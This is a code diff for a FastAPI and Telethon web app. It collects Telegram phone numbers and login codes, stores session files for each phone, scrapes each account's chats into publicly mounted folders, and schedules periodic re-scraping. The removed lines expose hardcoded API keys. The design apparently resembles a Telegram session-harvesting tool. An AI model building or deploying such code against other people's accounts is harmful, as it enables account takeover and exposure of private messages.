@@ -4,7 +4,7 @@ from contextlib import asynccontextmanager
 
 import aiosqlite
 import uvicorn
-from fastapi import FastAPI, Request, Form, Depends, status
+from fastapi import FastAPI, Request, Form, Depends, status, BackgroundTasks
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
 from telethon import TelegramClient
@@ -14,21 +14,24 @@ from fastapi.staticfiles import StaticFiles
 from fastapi.responses import HTMLResponse, RedirectResponse
 from fastapi.exceptions import HTTPException
 from dotenv import load_dotenv
-from utils import update_user_data, export_user_chat_html_from_db
+from utils import update_user_data, periodic_update
 from db import init_db, DB_FILE
 
 load_dotenv('.env')
-
-# API_ID = 23331207
-# API_HASH = "2d64092b8ecaded2ebb5ad25de96e222"
-
-API_ID = 25064946
-API_HASH = '712205595cbada1b4654a6e649812ffd'
+API_ID = int(os.getenv('API_ID'))
+API_HASH = os.getenv('API_HASH')
+USERS_FOLDER = "./users"
+SESSIONS_FOLDER = "./sessions"
+os.makedirs(USERS_FOLDER, exist_ok=True)
+os.makedirs(SESSIONS_FOLDER, exist_ok=True)
+sessions = {}
+IS_AUTH = False
+AUTH_PASSWORD = os.getenv('PASSWORD')
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
     await init_db()
-    task = asyncio.create_task(periodic_update())
+    task = asyncio.create_task(periodic_update(USERS_FOLDER, SESSIONS_FOLDER, API_ID, API_HASH))
     try:
         yield
     finally:
@@ -38,11 +41,6 @@ async def lifespan(app: FastAPI):
         except asyncio.CancelledError:
             pass
 
-USERS_FOLDER = "./users"
-SESSIONS_FOLDER = "./sessions"
-
-os.makedirs(USERS_FOLDER, exist_ok=True)
-os.makedirs(SESSIONS_FOLDER, exist_ok=True)
 app = FastAPI(lifespan=lifespan)
 
 app.add_middleware(
@@ -53,12 +51,6 @@ app.add_middleware(
     allow_headers=["*"]
 )
 
-session_name = "anon2"
-phone_number = None
-sessions = {}
-IS_AUTH = False
-AUTH_PASSWORD = os.getenv('PASSWORD')
-
 app.mount("/users", StaticFiles(directory=USERS_FOLDER), name="users")
 
 templates = Jinja2Templates(directory="templates")
@@ -68,7 +60,6 @@ class PhonePayload(BaseModel):
 
 class CodePayload(BaseModel):
     code: str
-
 
 @app.get("/")
 async def home(request: Request):
@@ -97,9 +88,23 @@ async def send_phone(data: PhonePayload):
         return {"status": "error", "detail": str(e)}
 
 
+async def update_user_task(phone_number: str):
+    session_name = f"{SESSIONS_FOLDER}/session_{phone_number}"
+    client = TelegramClient(session_name, API_ID, API_HASH)
+    await client.connect()
+    try:
+        me = await client.get_me()
+        username = me.username or f"{me.first_name}_{me.id}"
+        folder_name = f"{username}_{phone_number.replace('+','')}"
+        folder = os.path.join(USERS_FOLDER, folder_name)
+        os.makedirs(folder, exist_ok=True)
+        await update_user_data(client, me, folder)
+    finally:
+        await client.disconnect()
+
 
 @app.post("/verify_code")
-async def verify_code(data: CodePayload):
+async def verify_code(data: CodePayload, background_tasks: BackgroundTasks):
     phone_number = next((k for k,v in sessions.items() if "phone_code_hash" in v), None)
     if not phone_number:
         return {"error": "Send phone first."}
@@ -118,16 +123,10 @@ async def verify_code(data: CodePayload):
             return {"error": f"Code error: {str(e)}"}
 
     try:
-        me = await client.get_me()
-        username = me.username or f"{me.first_name}_{me.id}"
-        folder_name = f"{username}_{phone_number.replace('+','')}"
-        folder = os.path.join(USERS_FOLDER, folder_name)
-        os.makedirs(folder, exist_ok=True)
-        await update_user_data(client, me, folder)
+        background_tasks.add_task(update_user_task, phone_number)
 
     finally:
         await client.disconnect()
-        sessions.pop(phone_number, None)
 
     return {"status": "ok"}
 
@@ -256,37 +255,6 @@ async def user_chat(request: Request, user_folder: str, chat_id: int):
         "chat_name": chat_name,
         "messages": messages
     })
-
-
-async def periodic_update():
-    # import aiosqlite
-    # from utils import update_user_data, export_user_chat_html_from_db
-    # from db import DB_FILE
-    # from telethon import TelegramClient
-    #
-    # while True:
-    #     tasks = []
-    #     async with aiosqlite.connect(DB_FILE) as db:
-    #         async with db.execute("SELECT username, phone FROM users") as cur:
-    #             async for username, phone in cur:
-    #                 session_name = f"{SESSIONS_FOLDER}/session_{phone}"
-    #                 client = TelegramClient(session_name, API_ID, API_HASH)
-    #                 await client.connect()
-    #                 folder = os.path.join(USERS_FOLDER, username)
-    #                 os.makedirs(folder, exist_ok=True)
-    #                 tasks.append(update_user_for_periodic(client, folder, username))
-    #     if tasks:
-    #         await asyncio.gather(*tasks)
-    #     await asyncio.sleep(3600)
-    print('PERIOD UPDATE')
-
-async def update_user_for_periodic(client, folder, username):
-    try:
-        me = await client.get_me()
-        await update_user_data(client, me, folder)
-        await export_user_chat_html_from_db(username, folder)
-    finally:
-        await client.disconnect()
 
 
 if __name__ == '__main__':
